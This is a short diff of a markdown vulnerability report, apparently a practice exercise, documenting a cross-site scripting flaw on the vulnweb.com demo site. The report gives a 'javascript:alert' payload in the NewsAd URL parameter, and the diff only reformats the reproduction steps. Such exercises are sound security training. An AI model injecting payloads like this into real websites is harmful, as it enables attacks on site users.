@@ -13,9 +13,9 @@
 ###A.	The URL of the website with the described vulnerability.
   TestURL:http://testaspnet.vulnweb.com/ReadNews.aspx?NewsAd=javascript%3Aalert%28%22This%20is%20attact%22%29%3B&id=0
 ###B.	Steps taken to exploit the vulnerability.
-  >First, change the original URL: http://testaspnet.vulnweb.com/ReadNews.aspx?NewsAd=ads%2fdef.html&id=0
-    >To: http://testaspnet.vulnweb.com/ReadNews.aspx?NewsAd=javascript%3Aalert%28%22This%20is%20attact%22%29%3B&id=0
-  >Second, press Enter;
+   First, change the original URL: http://testaspnet.vulnweb.com/ReadNews.aspx?NewsAd=ads%2fdef.html&id=0<br /> 
+   To: http://testaspnet.vulnweb.com/ReadNews.aspx?NewsAd=javascript%3Aalert%28%22This%20is%20attact%22%29%3B&id=0
+   Second, press Enter;
 ###C.	A screenshot (if applicable) of the vulnerability.
 
 
